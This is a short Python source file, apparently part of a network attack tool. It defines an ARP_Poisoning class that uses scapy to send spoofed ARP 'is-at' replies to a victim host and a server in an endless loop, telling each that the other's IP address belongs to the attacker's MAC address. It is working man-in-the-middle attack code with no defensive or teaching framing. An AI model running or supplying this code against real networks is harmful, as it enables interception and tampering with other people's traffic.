import scapy.all as scapy
import time
import sys
import re
import ipaddress

class ARP_Poisoning:
    def __init__(self, iface, packet_interval, victim_mac, victim_ip, server_ip, server_mac, attacker_mac, attacker_ip):
        self.iface = iface
        self.packet_interval = packet_interval
        self.victim_mac = victim_mac
        self.victim_ip = victim_ip
        self.server_mac = server_mac
        self.server_ip = server_ip
        self.attacker_mac = attacker_mac
        self.attacker_ip = attacker_ip
    
    def run(self):
        try:
            while True:
                # sending spoofed ARP packet to the victim
                arp_victim = scapy.Ether(src=self.attacker_mac, dst=self.victim_mac) / scapy.ARP(
                    psrc=self.server_ip, 
                    hwsrc=self.attacker_mac,
                    pdst=self.victim_ip, 
                    hwdst=self.victim_mac,
                    op = "is-at")
                scapy.sendp(arp_victim, iface=self.iface, verbose=False)

                # sending spoofed ARP packet to the server
                arp_server = scapy.Ether(src=self.attacker_mac, dst=self.server_mac) / scapy.ARP(
                    psrc=self.victim_ip, 
                    hwsrc=self.attacker_mac,
                    pdst=self.server_ip, 
                    hwdst=self.server_mac,
                    op = "is-at")
                scapy.sendp(arp_server, iface=self.iface, verbose=False)

                # sleep for the specified interval
                time.sleep(self.packet_interval)
        except KeyboardInterrupt:
            print("Stopping ARP poisoning")
    
    

    

    